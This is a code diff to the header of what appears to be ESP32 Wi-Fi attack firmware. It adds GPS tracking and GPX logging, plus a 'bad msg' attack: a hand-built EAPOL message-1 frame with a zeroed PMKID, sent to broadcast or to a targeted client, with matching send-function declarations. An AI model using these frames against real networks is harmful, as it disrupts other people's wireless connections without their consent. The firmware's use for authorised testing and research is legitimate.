@@ -111,6 +111,9 @@
 #define WIFI_CONNECTED 52
 #define WIFI_PING_SCAN 53
 #define WIFI_PORT_SCAN_ALL 54
+#define GPS_TRACKER 55
+#define WIFI_ATTACK_BAD_MSG 56
+#define WIFI_ATTACK_BAD_MSG_TARGETED 57
 
 #define BASE_MULTIPLIER 4
 
@@ -381,6 +384,51 @@ class WiFiScan
                               0xf0, 0xff, 0x02, 0x00
                           };
 
+    uint8_t eapol_packet_bad_msg1[153] = {
+                              0x08, 0x02,                         // Frame Control (EAPOL)
+                              0x00, 0x00,                         // Duration
+                              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+                              0x00, 0x00,                         // Sequence Control
+                              /* LLC / SNAP */
+                              0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
+                              0x88, 0x8e,                          // Ethertype = EAPOL
+                              /* -------- 802.1X Header -------- */
+                              0x02,                               // Version 802.1X‑2004
+                              0x03,                               // Type Key
+                              0x00, 0x75,                          // Length 117 bytes
+                              /* -------- EAPOL‑Key frame body (117 B) -------- */
+                              0x02,                               // Desc Type 2 (AES/CCMP)
+                              0x00, 0xCA,                          // Key Info (Install|Ack…)
+                              0x00, 0x10,                          // Key Length = 16
+                              /* Replay Counter (8) */
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+                              /* Nonce (32) */
+                              0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+                              0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+                              0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
+                              0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
+                              /* Key IV (16) */
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              /* Key RSC (8) */
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              /* Key ID  (8) */ 
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              /* Key MIC (16) */ 
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                              /* Key Data Len (2) */ 
+                              0x00, 0x16,
+                              /* Key Data (22 B) */
+                              0xDD, 0x16,                // Vendor‑specific (PMKID IE)
+                              0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
+                              /* PMKID (16 byte zero) */
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                          };
+
     enum EBLEPayloadType
     {
       Microsoft,
@@ -448,14 +496,17 @@ class WiFiScan
     void tftDrawGraphObjects();
     void sendProbeAttack(uint32_t currentTime);
     void sendDeauthAttack(uint32_t currentTime, String dst_mac_str = "ff:ff:ff:ff:ff:ff");
+    void sendBadMsgAttack(uint32_t currentTime, bool all = false);
     void sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str = "ff:ff:ff:ff:ff:ff");
     void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]);
+    void sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str = "ff:ff:ff:ff:ff:ff", uint8_t sec = WIFI_SECURITY_WPA2);
+    void sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec = WIFI_SECURITY_WPA2);
     void broadcastRandomSSID(uint32_t currentTime);
     void broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid);
     void broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid);
     void broadcastSetSSID(uint32_t current_time, const char* ESSID);
     void RunAPScan(uint8_t scan_mode, uint16_t color);
-    void RunGPSInfo();
+    void RunGPSInfo(bool tracker = false);
     void RunGPSNmea();
     void RunMimicFlood(uint8_t scan_mode, uint16_t color);
     void RunPwnScan(uint8_t scan_mode, uint16_t color);
@@ -477,6 +528,9 @@ class WiFiScan
     void RunPortScanAll(uint8_t scan_mode, uint16_t color);
     bool checkMem();
     void parseBSSID(const char* bssidStr, uint8_t* bssid);
+    void logPoint(String lat, String lon, float alt, String datetime);
+    void writeHeader();
+    void writeFooter();
 
 
   public:
@@ -500,6 +554,7 @@ class WiFiScan
     bool force_pmkid = false;
     bool force_probe = false;
     bool save_pcap = false;
+    bool ep_deauth = false;
 
     String analyzer_name_string = "";
     
@@ -571,6 +626,13 @@ class WiFiScan
           .magic = WIFI_INIT_CONFIG_MAGIC\
       };
     #else
+      wifi_country_t country = {
+        .cc = "PH",
+        .schan = 1,
+        .nchan = 13,
+        .policy = WIFI_COUNTRY_POLICY_AUTO,
+      };
+
       wifi_init_config_t cfg2 = WIFI_INIT_CONFIG_DEFAULT();
     #endif
 
@@ -620,6 +682,7 @@ class WiFiScan
     void RunLoadAPList();
     void RunSaveATList(bool save_as = true);
     void RunLoadATList();
+    void RunSetupGPSTracker();
     void channelHop();
     uint8_t currentScanMode = 0;
     void main(uint32_t currentTime);
@@ -631,6 +694,7 @@ class WiFiScan
     bool save_serial = false;
     void startPcap(String file_name);
     void startLog(String file_name);
+    void startGPX(String file_name);
     //String macToString(const Station& station);
 
     static void getMAC(char *addr, uint8_t* data, uint16_t offset);
